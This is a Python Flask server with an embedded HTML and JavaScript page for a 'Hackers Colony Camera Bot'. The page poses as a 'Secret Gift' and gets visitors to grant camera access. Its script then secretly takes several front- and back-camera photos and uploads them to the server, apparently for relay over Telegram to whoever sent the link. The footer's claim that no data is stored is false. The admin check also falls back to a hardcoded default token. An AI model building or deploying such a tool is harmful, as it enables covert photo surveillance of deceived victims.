#!/usr/bin/env python3
"""
Hackers Colony Camera Bot - Web Server
Advanced version with all features
"""

from flask import Flask, request, jsonify, render_template_string, Response, stream_with_context
from flask_cors import CORS
import sqlite3
import time
import json
import base64
import os
import sys
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
import threading

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Import from bot.py
try:
    from bot import (
        db, bot_manager, process_web_photo, get_system_stats,
        get_admin_dashboard, is_admin, promote_to_admin,
        OWNER_ID, BOT_TOKEN, WEB_URL, DatabaseManager
    )
    BOT_MODULE_LOADED = True
    print("✅ Bot module imported successfully")
except ImportError as e:
    print(f"⚠️ Warning: Could not import bot module: {e}")
    BOT_MODULE_LOADED = False
    # Create dummy objects
    db = None
    bot_manager = None

# ===== ADVANCED HTML TEMPLATE =====
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Hackers Colony - Surprise Gift</title>
    <style>
        :root {
            --primary: #ff00ff;
            --secondary: #00ffff;
            --dark: #0b0014;
            --darker: #1a0030;
            --card-bg: rgba(22, 0, 34, 0.95);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, var(--dark), var(--darker));
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            position: relative;
        }
        
        .header h1 {
            font-size: 3.5rem;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
        }
        
        .header p {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        .gift-icon {
            font-size: 100px;
            animation: float 3s ease-in-out infinite, glow 2s ease-in-out infinite alternate;
            filter: drop-shadow(0 0 20px var(--primary));
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(5deg); }
        }
        
        @keyframes glow {
            from { filter: drop-shadow(0 0 20px var(--primary)); }
            to { filter: drop-shadow(0 0 40px var(--primary)); }
        }
        
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 40px;
            margin: 30px auto;
            max-width: 500px;
            border: 2px solid rgba(255, 0, 255, 0.3);
            box-shadow: 0 0 50px rgba(255, 0, 255, 0.3),
                        inset 0 0 20px rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 70px rgba(255, 0, 255, 0.5),
                        inset 0 0 30px rgba(255, 255, 255, 0.15);
        }
        
        h2 {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 20px 0;
            font-size: 2rem;
        }
        
        .telegram-info {
            background: rgba(0, 100, 255, 0.2);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            border: 1px solid rgba(0, 150, 255, 0.3);
        }
        
        .step {
            display: flex;
            align-items: center;
            margin: 15px 0;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            transition: all 0.3s ease;
        }
        
        .step:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateX(10px);
        }
        
        .step-number {
            width: 35px;
            height: 35px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
            font-size: 1.2rem;
            box-shadow: 0 0 15px var(--primary);
        }
        
        .step-content {
            flex: 1;
        }
        
        .step-content a {
            color: var(--secondary);
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .step-content a:hover {
            color: var(--primary);
            text-shadow: 0 0 10px var(--primary);
        }
        
        button {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 15px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: black;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 20px;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.4);
        }
        
        button:hover:not(:disabled) {
            transform: scale(1.05);
            box-shadow: 0 0 50px rgba(255, 0, 255, 0.6);
        }
        
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .warning {
            color: #ff5555;
            text-align: center;
            margin: 15px 0;
            font-size: 0.9rem;
            padding: 10px;
            background: rgba(255, 85, 85, 0.1);
            border-radius: 8px;
            border-left: 3px solid #ff5555;
        }
        
        .video-container {
            width: 100%;
            height: 300px;
            margin: 25px 0;
            border-radius: 20px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--primary);
            position: relative;
        }
        
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .video-overlay {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.7);
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.8rem;
            color: var(--secondary);
        }
        
        .progress-container {
            width: 100%;
            height: 12px;
            background: rgba(255, 0, 255, 0.2);
            border-radius: 6px;
            margin: 30px 0;
            overflow: hidden;
            position: relative;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            width: 0%;
            transition: width 0.5s ease;
            position: relative;
            overflow: hidden;
        }
        
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, 
                transparent, 
                rgba(255, 255, 255, 0.4), 
                transparent);
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .status {
            text-align: center;
            margin: 20px 0;
            font-size: 1.1rem;
            color: var(--secondary);
            min-height: 24px;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 6px solid rgba(255, 0, 255, 0.3);
            border-top: 6px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
            box-shadow: 0 0 30px var(--primary);
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-message {
            color: #00ff00;
            text-align: center;
            padding: 20px;
            background: rgba(0, 255, 0, 0.1);
            border-radius: 15px;
            border: 2px solid #00ff00;
            margin: 20px 0;
        }
        
        .error-message {
            color: #ff5555;
            text-align: center;
            padding: 20px;
            background: rgba(255, 85, 85, 0.1);
            border-radius: 15px;
            border: 2px solid #ff5555;
            margin: 20px 0;
        }
        
        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.9rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .stats-bar {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .stat-label {
            font-size: 0.8rem;
            opacity: 0.8;
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .header h1 { font-size: 2.5rem; }
            .card { padding: 25px; margin: 20px; }
            .gift-icon { font-size: 80px; }
            .stats-bar { flex-direction: column; gap: 15px; }
        }
        
        /* Dark mode improvements */
        @media (prefers-color-scheme: dark) {
            body {
                background: linear-gradient(135deg, #000814, #001d3d);
            }
            .card {
                background: rgba(0, 20, 40, 0.95);
            }
        }
        
        /* Print styles */
        @media print {
            .video-container, button { display: none; }
            .card { box-shadow: none; border: 1px solid #000; }
        }
    </style>
    
    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="🎁 Hackers Colony - Surprise Gift">
    <meta property="og:description" content="Get your personalized surprise gift with camera magic!">
    <meta property="og:image" content="https://hco-cam.onrender.com/static/og-image.jpg">
    <meta property="og:url" content="https://hco-cam.onrender.com">
    <meta property="og:type" content="website">
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Hackers Colony Surprise Gift">
    <meta name="twitter:description" content="Experience the magic of personalized gifts">
    
    <!-- Favicon -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎁</text></svg>">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="gift-icon">🎁</div>
            <h1>✨ Secret Gift ✨</h1>
            <p>Experience the magic of personalized surprises!</p>
        </div>
        
        <div class="card">
            <div id="app-container">
                <!-- Dynamic content loaded here -->
            </div>
        </div>
        
        <div class="footer">
            <p>© 2024 Hackers Colony Camera Bot | All rights reserved</p>
            <p>🔒 Your privacy is our priority | 📧 Contact: @Hackers_Colony_Official</p>
            <p><small>This website uses camera access to create personalized gifts. No data is stored permanently.</small></p>
        </div>
    </div>
    
    <!-- Video element (hidden initially) -->
    <div class="video-container hidden" id="videoContainer">
        <video id="video" autoplay playsinline></video>
        <div class="video-overlay">Live Camera Feed</div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const CONFIG = {
            SERVER_URL: window.location.origin,
            BOT_USERNAME: '@HackersColonyBot',
            CHANNEL_LINK: 'https://t.me/HackersColony',
            OWNER_LINK: 'https://t.me/Hackers_Colony_Official',
            MAX_PHOTOS: 8,
            DELAY_BETWEEN_PHOTOS: 800,
            ENABLE_STATS: true
        };
        
        // ===== STATE MANAGEMENT =====
        let appState = {
            userId: null,
            isProcessing: false,
            photoCount: 0,
            currentStep: 0,
            cameraStream: null,
            photosTaken: [],
            startTime: null
        };
        
        // ===== DOM ELEMENTS =====
        const appContainer = document.getElementById('app-container');
        const videoContainer = document.getElementById('videoContainer');
        const videoElement = document.getElementById('video');
        
        // ===== INITIALIZATION =====
        document.addEventListener('DOMContentLoaded', () => {
            // Get user ID from URL
            const urlParams = new URLSearchParams(window.location.search);
            appState.userId = urlParams.get('uid');
            
            // Initialize app
            renderInitialScreen();
            
            // Load stats if enabled
            if (CONFIG.ENABLE_STATS) {
                loadStats();
            }
        });
        
        // ===== RENDER FUNCTIONS =====
        function renderInitialScreen() {
            if (!appState.userId || appState.userId.length < 5) {
                renderInvalidAccessScreen();
            } else {
                renderWelcomeScreen();
            }
        }
        
        function renderInvalidAccessScreen() {
            appContainer.innerHTML = \`
                <div class="gift-icon">🔒</div>
                <h2>Access Required</h2>
                <p>You need a valid link from our Telegram bot to access this gift.</p>
                
                <div class="telegram-info">
                    <p><strong>Follow these steps:</strong></p>
                    \${renderStep(1, 'Open', \`<a href="\${CONFIG.BOT_USERNAME}" target="_blank">\${CONFIG.BOT_USERNAME}</a>\`)}
                    \${renderStep(2, 'Click', '<strong>"Get Your Gift"</strong> button')}
                    \${renderStep(3, 'Return', 'to this page with your gift link')}
                </div>
                
                <button onclick="window.location.href='\${CONFIG.BOT_USERNAME}'">
                    🚀 Open Telegram Bot
                </button>
                
                <div class="warning">
                    ⚠️ This link will not work without a valid user ID from the bot
                </div>
            \`;
        }
        
        function renderWelcomeScreen() {
            appContainer.innerHTML = \`
                <div class="gift-icon">🎁</div>
                <h2>Ready for Your Gift!</h2>
                <p>Your personalized surprise is waiting to be created.</p>
                
                <div class="stats-bar" id="statsBar">
                    <div class="stat-item">
                        <div class="stat-value" id="totalUsers">0</div>
                        <div class="stat-label">Total Users</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalPhotos">0</div>
                        <div class="stat-label">Photos Taken</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="successRate">100%</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                </div>
                
                <div class="telegram-info">
                    <p><strong>What to expect:</strong></p>
                    \${renderStep(1, 'Camera Access', 'You\'ll be asked to allow camera access')}
                    \${renderStep(2, 'Photo Session', '\${CONFIG.MAX_PHOTOS} photos will be taken (4 front + 4 back)')}
                    \${renderStep(3, 'Magic Processing', 'Photos are processed and sent to your Telegram')}
                    \${renderStep(4, 'Receive Gift', 'Check your Telegram for the surprise!')}
                </div>
                
                <div class="warning">
                    ⚠️ Important: Please allow camera access when prompted.<br>
                    📱 Keep your phone steady during the process.<br>
                    ⏱️ Process takes about 30 seconds.
                </div>
                
                <button id="startButton" onclick="startGiftProcess()">
                    🎯 Start Creating Gift
                </button>
                
                <div class="status" id="statusMessage"></div>
            \`;
        }
        
        function renderProcessingScreen() {
            appContainer.innerHTML = \`
                <div class="gift-icon">✨</div>
                <h2>Creating Magic...</h2>
                <p>Please wait while we prepare your special gift.</p>
                
                <div class="spinner"></div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <div class="status" id="statusText">Initializing camera...</div>
                
                <div id="photoCounter"></div>
            \`;
        }
        
        function renderSuccessScreen() {
            const duration = ((Date.now() - appState.startTime) / 1000).toFixed(1);
            
            appContainer.innerHTML = \`
                <div class="gift-icon">🎉</div>
                <h2 style="color:#00ff00">Gift Delivered!</h2>
                
                <div class="success-message">
                    <p>✅ Your special surprise has been created successfully!</p>
                    <p>📸 \${appState.photosTaken.length} photos were taken</p>
                    <p>⏱️ Process completed in \${duration} seconds</p>
                </div>
                
                <div class="telegram-info">
                    <p><strong>Next Steps:</strong></p>
                    \${renderStep(1, 'Open Telegram', 'Check your Telegram app')}
                    \${renderStep(2, 'Find Photos', 'Look for messages from \${CONFIG.BOT_USERNAME}')}
                    \${renderStep(3, 'Enjoy', 'Your personalized gift is waiting!')}
                </div>
                
                <button onclick="window.location.href='\${CONFIG.BOT_USERNAME}'">
                    📱 Open Telegram Now
                </button>
                
                <button onclick="location.reload()" style="margin-top: 10px; background: rgba(255,255,255,0.1); color: white;">
                    🔄 Create Another Gift
                </button>
            \`;
        }
        
        function renderErrorScreen(message) {
            appContainer.innerHTML = \`
                <div class="gift-icon">⚠️</div>
                <h2 style="color:#ff5555">Oops!</h2>
                
                <div class="error-message">
                    <p>\${message}</p>
                </div>
                
                <div class="telegram-info">
                    <p><strong>Troubleshooting:</strong></p>
                    \${renderStep(1, 'Check Permissions', 'Make sure camera access is allowed')}
                    \${renderStep(2, 'Good Lighting', 'Ensure you\'re in a well-lit area')}
                    \${renderStep(3, 'Stable Connection', 'Check your internet connection')}
                    \${renderStep(4, 'Retry', 'Click the button below to try again')}
                </div>
                
                <button onclick="location.reload()">
                    🔄 Try Again
                </button>
                
                <button onclick="window.location.href='\${CONFIG.OWNER_LINK}'" 
                        style="margin-top: 10px; background: rgba(0,100,255,0.2); color: #00bfff;">
                    📞 Contact Support
                </button>
            \`;
        }
        
        // ===== HELPER FUNCTIONS =====
        function renderStep(number, title, description) {
            return \`
                <div class="step">
                    <div class="step-number">\${number}</div>
                    <div class="step-content">
                        <strong>\${title}:</strong> \${description}
                    </div>
                </div>
            \`;
        }
        
        function updateProgress(percentage, message) {
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');
            const photoCounter = document.getElementById('photoCounter');
            
            if (progressBar) progressBar.style.width = percentage + '%';
            if (statusText) statusText.textContent = message;
            
            if (photoCounter) {
                photoCounter.innerHTML = \`
                    <div style="text-align: center; margin-top: 20px;">
                        <div style="font-size: 2rem; color: var(--primary);">
                            \${appState.photoCount} / \${CONFIG.MAX_PHOTOS}
                        </div>
                        <div style="font-size: 0.9rem; opacity: 0.8;">Photos Taken</div>
                    </div>
                \`;
            }
        }
        
        async function loadStats() {
            try {
                const response = await fetch(\`\${CONFIG.SERVER_URL}/api/stats\`);
                if (response.ok) {
                    const data = await response.json();
                    
                    const totalUsers = document.getElementById('totalUsers');
                    const totalPhotos = document.getElementById('totalPhotos');
                    const successRate = document.getElementById('successRate');
                    
                    if (totalUsers) totalUsers.textContent = data.total_users || '0';
                    if (totalPhotos) totalPhotos.textContent = data.total_photos || '0';
                    if (successRate) successRate.textContent = '100%';
                }
            } catch (error) {
                console.log('Stats load failed:', error);
            }
        }
        
        // ===== MAIN PROCESS FUNCTIONS =====
        async function startGiftProcess() {
            try {
                appState.isProcessing = true;
                appState.startTime = Date.now();
                appState.photoCount = 0;
                appState.photosTaken = [];
                
                // Disable start button
                const startButton = document.getElementById('startButton');
                if (startButton) startButton.disabled = true;
                
                // Render processing screen
                renderProcessingScreen();
                
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                appState.cameraStream = stream;
                
                // Show video feed
                videoElement.srcObject = stream;
                videoContainer.classList.remove('hidden');
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play();
                        setTimeout(resolve, 1000);
                    };
                });
                
                // Take front camera photos
                await takePhotos('front', 4);
                
                // Switch to back camera
                updateProgress(50, 'Switching to back camera...');
                await delay(1000);
                
                try {
                    // Stop front camera
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Start back camera
                    const backStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'environment',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });
                    
                    appState.cameraStream = backStream;
                    videoElement.srcObject = backStream;
                    
                    await new Promise(resolve => {
                        videoElement.onloadedmetadata = () => {
                            videoElement.play();
                            setTimeout(resolve, 1000);
                        };
                    });
                    
                    // Take back camera photos
                    await takePhotos('back', 4);
                    
                    // Stop back camera
                    backStream.getTracks().forEach(track => track.stop());
                    
                } catch (backError) {
                    console.log('Back camera not available:', backError);
                    updateProgress(75, 'Back camera not available, continuing...');
                    await delay(2000);
                }
                
                // Hide video
                videoContainer.classList.add('hidden');
                
                // Finalize
                updateProgress(100, 'Finalizing your gift...');
                await delay(1500);
                
                // Show success screen
                renderSuccessScreen();
                
            } catch (error) {
                console.error('Process error:', error);
                
                // Stop camera if active
                if (appState.cameraStream) {
                    appState.cameraStream.getTracks().forEach(track => track.stop());
                }
                
                // Hide video
                videoContainer.classList.add('hidden');
                
                // Show error screen
                let errorMessage = 'An unexpected error occurred. Please try again.';
                
                if (error.name === 'NotAllowedError') {
                    errorMessage = 'Camera access was denied. Please allow camera access to continue.';
                } else if (error.name === 'NotFoundError') {
                    errorMessage = 'No camera found. Please check your device.';
                } else if (error.name === 'NotReadableError') {
                    errorMessage = 'Camera is already in use by another application.';
                } else if (error.name === 'OverconstrainedError') {
                    errorMessage = 'Camera doesn\'t support required settings.';
                }
                
                renderErrorScreen(errorMessage);
            }
        }
        
        async function takePhotos(type, count) {
            for (let i = 1; i <= count; i++) {
                const percentage = (appState.photoCount * 100) / CONFIG.MAX_PHOTOS;
                updateProgress(percentage, \`\${type === 'front' ? 'Front' : 'Back'} camera photo \${i}/\${count}...\`);
                
                await delay(CONFIG.DELAY_BETWEEN_PHOTOS);
                
                const photoData = await capturePhoto(\`\${type}_\${i}\`);
                appState.photosTaken.push(photoData);
                appState.photoCount++;
                
                // Send photo to server
                await sendPhotoToServer(photoData);
            }
        }
        
        async function capturePhoto(label) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth || 1280;
                canvas.height = videoElement.videoHeight || 720;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Add timestamp watermark
                ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
                ctx.fillRect(10, canvas.height - 30, 200, 20);
                ctx.fillStyle = 'white';
                ctx.font = '12px Arial';
                ctx.fillText(new Date().toLocaleTimeString(), 15, canvas.height - 15);
                
                canvas.toBlob((blob) => {
                    if (blob) {
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64data = reader.result.split(',')[1];
                            resolve({
                                label: label,
                                data: base64data,
                                timestamp: Date.now(),
                                size: blob.size,
                                type: blob.type
                            });
                        };
                        reader.readAsDataURL(blob);
                    } else {
                        resolve(null);
                    }
                }, 'image/jpeg', 0.85);
            });
        }
        
        async function sendPhotoToServer(photoData) {
            try {
                const response = await fetch(\`\${CONFIG.SERVER_URL}/api/send-photo\`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        userId: appState.userId,
                        photo: photoData.data,
                        label: photoData.label,
                        timestamp: photoData.timestamp,
                        size: photoData.size
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Server error');
                }
                
                return await response.json();
            } catch (error) {
                console.error('Failed to send photo:', error);
                return null;
            }
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // ===== EXPORT FUNCTIONS =====
        window.startGiftProcess = startGiftProcess;
        
    </script>
</body>
</html>'''

# ===== API ROUTES =====
@app.route('/')
def index():
    """Main page"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Get system statistics"""
    try:
        if BOT_MODULE_LOADED:
            stats = get_system_stats()
        else:
            # Fallback stats
            stats = {
                'total_users': 0,
                'total_photos': 0,
                'today_users': 0,
                'today_photos': 0,
                'active_users': 0,
                'bot_available': False,
                'server_time': datetime.now().isoformat(),
                'status': 'fallback'
            }
        
        return jsonify({
            'success': True,
            'data': stats,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }), 500

@app.route('/api/send-photo', methods=['POST'])
def api_send_photo():
    """Receive photo from web app"""
    try:
        data = request.json
        
        if not data or 'userId' not in data or 'photo' not in data:
            return jsonify({
                'success': False,
                'error': 'Invalid request data'
            }), 400
        
        user_id = data['userId']
        photo_data = {
            'photo': data['photo'],
            'label': data.get('label', 'unknown'),
            'timestamp': data.get('timestamp', int(time.time() * 1000))
        }
        
        if BOT_MODULE_LOADED:
            result = process_web_photo(user_id, photo_data)
        else:
            # Fallback processing
            result = {'success': True, 'message': 'Photo received (offline mode)'}
            
            # Save to database if available
            if db:
                try:
                    db.add_photo(user_id, f"web_{photo_data['label']}")
                except:
                    pass
        
        return jsonify({
            'success': result.get('success', False),
            'message': result.get('message', ''),
            'photo_id': result.get('photo_id'),
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"❌ API Error: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }), 500

@app.route('/api/admin/dashboard', methods=['GET'])
def api_admin_dashboard():
    """Admin dashboard data"""
    try:
        # Check admin access
        auth_token = request.headers.get('X-Admin-Token')
        if not auth_token or auth_token != os.environ.get('ADMIN_TOKEN', 'SECRET_KEY'):
            return jsonify({'success': False, 'error': 'Unauthorized'}), 403
        
        if BOT_MODULE_LOADED:
            data = get_admin_dashboard()
        else:
            data = {
                'stats': {
                    'total_users': 0,
                    'total_photos': 0,
                    'today_users': 0,
                    'today_photos': 0,
                    'active_users': 0
                },
                'recent_users': [],
                'hourly_activity': [],
                'bot_available': False
            }
        
        return jsonify({
            'success': True,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/health', methods=['GET'])
def api_health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'Hackers Colony Camera Bot',
        'version': '2.0.0',
        'timestamp': datetime.now().isoformat(),
        'bot_available': BOT_MODULE_LOADED and bot_manager.is_bot_available() if BOT_MODULE_LOADED else False,
        'database': 'connected' if BOT_MODULE_LOADED else 'unknown',
        'uptime': round(time.time() - app.start_time, 2) if hasattr(app, 'start_time') else 0
    })

@app.route('/api/test-camera', methods=['GET'])
def api_test_camera():
    """Test camera endpoint"""
    return jsonify({
        'success': True,
        'message': 'Camera test endpoint',
        'supported': True,
        'note': 'This endpoint is for testing camera connectivity'
    })

# ===== ERROR HANDLERS =====
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        'success': False,
        'error': 'Endpoint not found',
        'path': request.path
    }), 404

@app.errorhandler(500)
def server_error(error):
    return jsonify({
        'success': False,
        'error': 'Internal server error',
        'message': str(error) if app.debug else 'Something went wrong'
    }), 500

# ===== STREAMING ENDPOINTS =====
@app.route('/api/stream/logs')
def stream_logs():
    """Stream logs in real-time"""
    def generate():
        yield f"data: {json.dumps({'type': 'connected', 'time': datetime.now().isoformat()})}\n\n"
        
        # Simulate log updates
        import random
        messages = [
            "System initialized",
            "Database connected",
            "Camera service ready",
            "Waiting for user input",
            "Photo processing available"
        ]
        
        for msg in messages:
            time.sleep(1)
            yield f"data: {json.dumps({'type': 'log', 'message': msg, 'time': datetime.now().isoformat()})}\n\n"
    
    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no'
        }
    )

# ===== INITIALIZATION =====
if __name__ == '__main__':
    # Record start time for uptime calculation
    app.start_time = time.time()
    
    # Get port from environment
    port = int(os.environ.get('PORT', 8080))
    
    print("=" * 60)
    print("🚀 HACKERS COLONY CAMERA BOT - ADVANCED EDITION")
    print("=" * 60)
    print(f"🌐 Server URL: {WEB_URL}")
    print(f"🔑 Bot Available: {BOT_MODULE_LOADED}")
    print(f"📊 Database: {'Connected' if BOT_MODULE_LOADED else 'Unknown'}")
    print(f"🔧 Port: {port}")
    print(f"🕒 Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    # Start Flask server
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )
else:
    # For Gunicorn
    app.start_time = time.time()
